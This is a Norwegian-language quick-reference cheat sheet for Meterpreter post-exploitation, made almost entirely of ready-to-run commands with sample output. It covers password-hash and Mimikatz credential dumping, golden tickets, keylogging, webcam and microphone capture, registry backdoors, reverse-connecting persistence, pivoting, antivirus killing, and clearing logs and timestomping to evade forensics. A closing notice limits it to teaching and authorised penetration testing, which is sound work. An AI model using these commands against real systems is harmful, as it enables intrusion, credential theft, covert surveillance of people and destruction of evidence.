# 🎭 Meterpreter – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)
> **Presisering:** Beskrivelsen av DLL-injeksjon, stager og TLS er en forenkling. Meterpreter finnes i flere implementasjoner og transportvarianter; ikke alle har samme innlasting, funksjoner eller minnespor. Migrering er en endring i målprosessen og er ikke alltid nødvendig eller risikofri, særlig ikke mot kritiske prosesser som LSASS. `getsystem` forsøker rettighetseskalering; kommandoen er ikke bare en kontroll av om økten allerede er hevet. Eldre skript og utvidelser i eksemplene er versjons- og plattformavhengige. Se [Metasploits dokumentasjon](https://docs.metasploit.com/). Pivotering betyr tilgang gjennom en mellomvert, og portvideresending kobler en lokal port til en annen tjeneste.


```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Det avanserte verktøyet for arbeid etter utnyttelse** – verktøykassen etter at tilgang er oppnådd

---

## 📋 Innholdsfortegnelse

- [Hva er Meterpreter?](#-hva-er-meterpreter)
- [Kjernekommandoer](#-kjernekommandoer)
- [Systeminformasjon](#-systeminformasjon)
- [Filsystemkommandoer](#-filsystemkommandoer)
- [Nettverkskommandoer](#-nettverkskommandoer)
- [Prosesskommandoer](#-prosesskommandoer)
- [Bruker- og rettighetskommandoer](#-bruker--og-rettighetskommandoer)
- [Innhenting av passord](#-innhenting-av-passord)
- [Tastelogging](#-tastelogging)
- [Skjermbilder og webkamera](#-skjermbilder-og-webkamera)
- [Vedvarende tilgang](#-vedvarende-tilgang)
- [Pivotering og portvideresending](#-pivotering-og-portvideresending)
- [Mottiltak mot etterforskning](#-mottiltak-mot-etterforskning)
- [Skripting og automatisering](#-skripting-og-automatisering)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
- [Tips og knep](#-tips-og-knep)

---

## 🎯 Hva er Meterpreter?

**Meterpreter** (Meta-Interpreter) er en avansert payload som kan utvides dynamisk, kjører gjennom DLL-injeksjon i minnet og kommuniserer via en stager-socket.

### Viktige egenskaper

| Egenskap | Beskrivelse |
|---------|-------------|
| **Kjøring i minnet** | Kjører i RAM og etterlater få spor |
| **Kryptert kommunikasjon** | TLS-kryptert kanal til C2-serveren |
| **Utvidbar** | Last inn utvidelser underveis |
| **Flere plattformer** | Windows, Linux, macOS, Android, PHP, Java |
| **Støtte for pivotering** | Ruter trafikk gjennom kompromitterte verter |

### Meterpreter-varianter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-kjernekommandoer"></a>
## ⌨️ Kjernekommandoer

### Hjelp og navigasjon

```bash
# Vis alle kommandoer
meterpreter > help

# Hent hjelp til en bestemt kommando
meterpreter > help upload

# Vis kanalinformasjon
meterpreter > channel -l
```

### Øktadministrasjon

```bash
# Hent øktinformasjon
meterpreter > info

# Legg gjeldende økt i bakgrunnen
meterpreter > background
meterpreter > bg

# Gå tilbake til msfconsole
meterpreter > exit

# Avslutt økten helt
meterpreter > quit

# Koble til igjen hvis forbindelsen brytes
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Kanaloperasjoner

```bash
# List aktive kanaler
meterpreter > channel -l

# Åpne kanalen interaktivt
meterpreter > channel -i <id>

# Les fra kanalen
meterpreter > channel -r <id>

# Skriv til kanalen
meterpreter > channel -w <id>

# Lukk kanalen
meterpreter > channel -c <id>
```

---

## 💻 Systeminformasjon

### Grunnleggende systeminformasjon

```bash
# Hent systeminformasjon
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Hent gjeldende bruker
meterpreter > getuid
Server username: WIN-PC\Administrator

# Hent ID for gjeldende prosess
meterpreter > getpid
Current pid: 1234

# Hent prosessnavn
meterpreter > getpname

# Kontroller om systemet kjører i en virtuell maskin
meterpreter > run post/windows/gather/checkvm
```

### Miljø og register

```bash
# List miljøvariabler
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Angi miljøvariabel
meterpreter > setenv VAR value

# Registeroperasjoner (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Installert programvare og oppdateringer

```bash
# List installerte applikasjoner
meterpreter > run post/windows/gather/enum_applications

# List installerte oppdateringer og hurtigrettinger
meterpreter > run post/windows/gather/enum_patches

# Se etter tjenestestier uten anførselstegn
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 Filsystemkommandoer

### Navigasjon

```bash
# Vis arbeidskatalogen
meterpreter > pwd
C:\Users\Administrator\Desktop

# List kataloginnholdet
meterpreter > ls
meterpreter > ls -la

# Bytt katalog
meterpreter > cd C:\\Users
meterpreter > cd ..

# Vis gjeldende lokale katalog
meterpreter > lpwd

# Bytt lokal katalog
meterpreter > lcd /tmp

# List lokal katalog
meterpreter > lls
```

### Filoperasjoner

```bash
# Les filinnholdet
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Rediger filen
meterpreter > edit C:\\file.txt

# Slett filen
meterpreter > rm C:\\temp\\malware.exe

# Opprett katalog
meterpreter > mkdir C:\\temp\\hidden

# Fjern katalog
meterpreter > rmdir C:\\temp\\hidden

# Kopier filen
meterpreter > cp source.txt destination.txt

# Flytt filen eller gi den nytt navn
meterpreter > mv oldname.txt newname.txt
```

### Filoverføring

```bash
# Last ned fil fra målet
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Last ned rekursivt
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Last opp fil til målet
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Vis fremdrift for nedlasting/opplasting
meterpreter > download -p C:\\large_file.zip
```

### Filsøk

```bash
# Søk etter filer
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Søk etter en bestemt filendelse på alle stasjoner
meterpreter > search -f *.kdbx

# Søk etter bestemte filnavnmønstre
meterpreter > search -f *password* -r
```

### Filhasher og tidsstempler

```bash
# Hent filens kontrollsum
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Endre tidsstempler (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Nettverkskommandoer

### Nettverksinformasjon

```bash
# Hent nettverksgrensesnitt
meterpreter > ipconfig
meterpreter > ifconfig

# Hent rutingtabellen
meterpreter > route

# Hent ARP-hurtigbufferen
meterpreter > arp

# Hent aktive nettverkstilkoblinger
meterpreter > netstat
```

### Portvideresending

```bash
# Videresend lokal port til ekstern vert
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# List portvideresendinger
meterpreter > portfwd list

# Slett portvideresending
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Fjern alle portvideresendinger
meterpreter > portfwd flush

# Eksempel: Videresend RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Koble deretter til: rdesktop 127.0.0.1:3389
```

### DNS- og nettverksverktøy

```bash
# Slå opp vertsnavn
meterpreter > resolve google.com

# Hent proxyinnstillinger
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-prosesskommandoer"></a>
## ⚙️ Prosesskommandoer

### Prosessoversikt

```bash
# List alle prosesser
meterpreter > ps

# Filtrer prosesser
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Hent informasjon om gjeldende prosess
meterpreter > getpid
```

### Prosessmanipulering

```bash
# Migrer til en annen prosess
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Avslutt en prosess
meterpreter > kill <PID>

# Kjør en kommando og hent utdata
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Kjør i bakgrunnen
meterpreter > execute -f notepad.exe -H

# Kjør med inn- og utdata gjennom en kanal
meterpreter > execute -f cmd.exe -c -i
```

### Tips om prosessmigrering

```bash
# Trygge mål for migrering (Windows)
# - explorer.exe (brukerkontekst, stabil)
# - svchost.exe (SYSTEM, flere instanser)
# - lsass.exe (SYSTEM, kreves for hashdump ifølge originalen)

# Finn explorer.exe og migrer
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Migrer automatisk til en stabil prosess
meterpreter > run post/windows/manage/migrate
```

---

## 👤 Bruker- og rettighetskommandoer

### Informasjon om gjeldende bruker

```bash
# Hent gjeldende bruker
meterpreter > getuid
Server username: WIN-PC\Administrator

# Hent gjeldende rettigheter
meterpreter > getprivs

# Kontroller om prosessen er hevet (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Rettighetseskalering

```bash
# Forsøk å oppnå SYSTEM-rettigheter
meterpreter > getsystem
meterpreter > getsystem -t 1  # Identitetsutgivelse via navngitt rør (i minnet/administrator)
meterpreter > getsystem -t 2  # Identitetsutgivelse via navngitt rør (dropper/administrator)
meterpreter > getsystem -t 3  # Duplisering av token (i minnet/administrator)

# Omgåelse av UAC (fra msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Forslag til lokale exploits
meterpreter > run post/multi/recon/local_exploit_suggester

# Stjel token fra en annen prosess
meterpreter > steal_token <PID>

# Forkast stjålet token
meterpreter > drop_token

# Utgi deg for å være en bruker
meterpreter > impersonate_token "DOMAIN\\Administrator"

# List tilgjengelige tokener
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Brukerkartlegging

```bash
# List lokale brukere
meterpreter > run post/windows/gather/enum_logged_on_users

# List domenebrukere (hvis maskinen er domenetilknyttet)
meterpreter > run post/windows/gather/enum_domain_users

# List lokale grupper
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Innhenting av passord

### Uthenting av hasher

```bash
# Hent ut passordhasher (krever SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Hvis hashdump feiler, prøv
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz-/Kiwi-utvidelsen

```bash
# Last inn Kiwi (Mimikatz)
meterpreter > load kiwi

# Hent alle påloggingsopplysninger
meterpreter > creds_all

# Hent passord fra minnet
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Hent ut Kerberos-billetter
meterpreter > kiwi_cmd sekurlsa::tickets

# Hent Wi-Fi-passord
meterpreter > kiwi_cmd misc::wifi

# LSA-uttrekk
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Innsamling av påloggingsopplysninger

```bash
# Søk etter påloggingsopplysninger i filer
meterpreter > run post/multi/gather/credentials/generic

# Påloggingsopplysninger i nettlesere
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# SSH-nøkler
meterpreter > run post/multi/gather/ssh_creds

# Windows Credential Manager
meterpreter > run post/windows/gather/enum_cred_store

# Påloggingsopplysninger i Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-tastelogging"></a>
## ⌨️ Tastelogging

### Starte og stoppe tastelogger

```bash
# Start tasteloggeren
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Hent registrerte tastetrykk
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Stopp tasteloggeren
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Avansert tastelogging

```bash
# Kjør tasteloggeren som egen prosess
meterpreter > run post/windows/capture/keylog_recorder

# Migrer til en prosess med tastaturtilgang (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Skjermbilder og webkamera

### Skjermbilder

```bash
# Ta ett skjermbilde
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Ta skjermbilde med egen filsti
meterpreter > screenshot -p /tmp/screen.jpg

# Ta skjermbilder fortløpende
meterpreter > run post/multi/gather/screen_spy

# Se skrivebordet i sanntid
meterpreter > screenshare
```

### Webkameraoperasjoner

```bash
# List webkameraer
meterpreter > webcam_list
1: Integrated Webcam

# Ta et bilde fra webkameraet
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Ta bilde med innstillinger
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Strøm webkameraet i sanntid
meterpreter > webcam_stream
```

### Lydopptak

```bash
# Ta opp fra mikrofonen
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Ta opp med valgt varighet
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Vedvarende tilgang

### Vedvarende tilgang i Windows

```bash
# Vedvarende tilgang via registeret
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Vedvarende tilgang via planlagt oppgave
meterpreter > run post/windows/manage/persistence_exe

# Vedvarende tilgang via tjeneste
meterpreter > run metsvc

# Vedvarende tilgang via WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Forklaring av innstillinger for vedvarende tilgang

```bash
# Innstillinger for persistence-skriptet
-A        # Start automatisk en passende handler
-L <path> # Plassering for payloaden
-P <path> # Payload som skal brukes
-S        # Start som tjeneste (med SYSTEM)
-T        # Alternativ EXE-mal
-U        # Start ved brukerpålogging
-X        # Start ved systemoppstart
-i <sec>  # Intervall mellom tilkoblingsforsøk
-p <port> # Porten payloaden skal koble til
-r <ip>   # IP-adressen payloaden skal koble til
```

### Fjerne vedvarende tilgang

```bash
# List mekanismer for vedvarende tilgang
meterpreter > run post/windows/gather/enum_persistence

# Fjern vedvarende tilgang (manuelt)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Pivotering og portvideresending

### Ruteadministrasjon

```bash
# Legg til rute gjennom økten
meterpreter > run autoroute -s 10.10.10.0/24

# Vis ruter
meterpreter > run autoroute -p

# Slett rute
meterpreter > run autoroute -d -s 10.10.10.0/24

# Fra msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### SOCKS-proxy

```bash
# Start SOCKS-proxy (fra msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Konfigurer proxychains
# Rediger /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Bruk sammen med proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Eksempler på portvideresending

```bash
# Videresend lokal port til intern vert
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Omvendt portvideresending
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Eksempelsituasjoner:
# Tilgang til intern webserver
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Tilgang til intern RDP
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Tilgang til intern SMB
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Mottiltak mot etterforskning

### Fjerne spor

```bash
# Tøm Windows-hendelseslogger
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Endre tidsstempler på filer
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Teknikker for å unngå deteksjon

```bash
# Migrer til en legitim prosess
meterpreter > migrate -N svchost.exe

# Kontroller om systemet overvåkes
meterpreter > run post/windows/gather/enum_av

# Deaktiver antivirus (risikabelt)
meterpreter > run post/windows/manage/killav

# Skjul prosessen
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Skripting og automatisering

### Ressursskript

```bash
# Opprett ressursskript
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Kjør ressursskript
meterpreter > resource post_exploit.rc
```

### Vanlige skript

```bash
# Systemkartlegging
meterpreter > run scraper

# Samle inn alt
meterpreter > run winenum

# Se etter virtuelle maskiner
meterpreter > run checkvm

# Hent lokale undernett for pivotering
meterpreter > run get_local_subnets

# Rekognosering på flere områder
meterpreter > run post/multi/recon/local_exploit_suggester
```

### IRB-shell (Ruby)

```bash
# Gå til IRB-modus
meterpreter > irb

# Eksempel: List filer
>> client.fs.dir.entries("C:\\")

# Eksempel: Les fil
>> client.fs.file.open("C:\\secret.txt").read

# Gå ut av IRB
>> exit
```

---

## 📊 Hurtigreferansetabell

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `sysinfo` | Systeminformasjon |
| `getuid` | Gjeldende bruker |
| `getpid` | ID for gjeldende prosess |
| `ps` | List prosesser |
| `migrate <PID>` | Flytt til en annen prosess |
| `getsystem` | Eskaler til SYSTEM |
| `hashdump` | Hent ut passordhasher |
| `shell` | Åpne systemets shell |
| `upload <src> <dst>` | Last opp fil |
| `download <src>` | Last ned fil |
| `screenshot` | Ta skjermbilde |
| `webcam_snap` | Ta webkamerabilde |
| `keyscan_start` | Start tastelogger |
| `keyscan_dump` | Hent tastetrykk |

### Filoperasjoner

| Kommando | Beskrivelse |
|---------|-------------|
| `pwd` | Vis arbeidskatalog |
| `cd <dir>` | Bytt katalog |
| `ls` | List filer |
| `cat <file>` | Les fil |
| `edit <file>` | Rediger fil |
| `rm <file>` | Slett fil |
| `mkdir <dir>` | Opprett katalog |
| `search -f <pattern>` | Søk etter filer |

### Nettverksoperasjoner

| Kommando | Beskrivelse |
|---------|-------------|
| `ipconfig` | Nettverksgrensesnitt |
| `route` | Rutingtabell |
| `netstat` | Aktive tilkoblinger |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Videresend port |
| `run autoroute -s <subnet>` | Legg til rute for pivotering |

### Rettighetseskalering

| Kommando | Beskrivelse |
|---------|-------------|
| `getsystem` | Skaff SYSTEM-rettigheter |
| `getprivs` | List gjeldende rettigheter |
| `steal_token <PID>` | Stjel token fra en prosess |
| `load incognito` | Last inn incognito-utvidelsen |
| `list_tokens -u` | List tilgjengelige tokener |
| `impersonate_token` | Utgi deg for å være en bruker ved hjelp av token |

### Innhenting av påloggingsopplysninger

| Kommando | Beskrivelse |
|---------|-------------|
| `hashdump` | Hent ut SAM-hasher |
| `load kiwi` | Last inn Mimikatz |
| `creds_all` | Alle påloggingsopplysninger |
| `lsa_dump_sam` | LSA-uttrekk av SAM |
| `kiwi_cmd <cmd>` | Kjør Mimikatz-kommando |

---

## 💡 Tips og knep

### Anbefalte arbeidsmåter

1. **Migrer alltid først**
   ```bash
   # Migrer til en stabil prosess før andre handlinger
   meterpreter > migrate -N explorer.exe
   ```

2. **Legg økter i bakgrunnen**
   ```bash
   # Legg øktene i bakgrunnen fremfor å lukke dem
   meterpreter > background
   ```

3. **Bruk krypterte payloads**
   ```bash
   # Foretrekk HTTPS-payloads
   windows/meterpreter/reverse_https
   ```

4. **Kontroller før du handler**
   ```bash
   # Kontroller alltid rettighetene
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Feilsøking

| Problem | Løsning |
|-------|----------|
| Økten avsluttes | Migrer til en stabil prosess |
| hashdump feiler | Skaff SYSTEM først med `getsystem` |
| getsystem feiler | Prøv en annen teknikk med `-t 1,2,3` |
| Tasteloggeren er tom | Migrer til explorer.exe |
| Kommandoer får tidsavbrudd | Kontroller nettverkstilkoblingen |

### Tips for å unngå oppdagelse

```bash
# 1. Migrer bort fra den opprinnelige prosessen
meterpreter > migrate -N svchost.exe

# 2. Fjern spor
meterpreter > clearev

# 3. Endre tidsstempler på opplastede filer
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Slett utplasserte filer når arbeidet er ferdig
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Juridisk merknad

> **ADVARSEL:** Denne hurtigreferansen er bare til undervisning og autorisert penetrasjonstesting. Uautorisert tilgang til datasystemer er ulovlig. Innhent alltid nødvendig tillatelse før testing.

---

## 📚 Relaterte ressurser

- [Veiledning til Metasploit Framework](README.nb.md)
- [Offensive Security-dokumentasjon](https://www.offensive-security.com/)
- [Rapid7s Metasploit-dokumentasjon](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Bli fortrolig med arbeid etter utnyttelse!</b><br>
  <i>Med Meterpreter fortsetter arbeidet etter den første tilgangen</i>
</p>
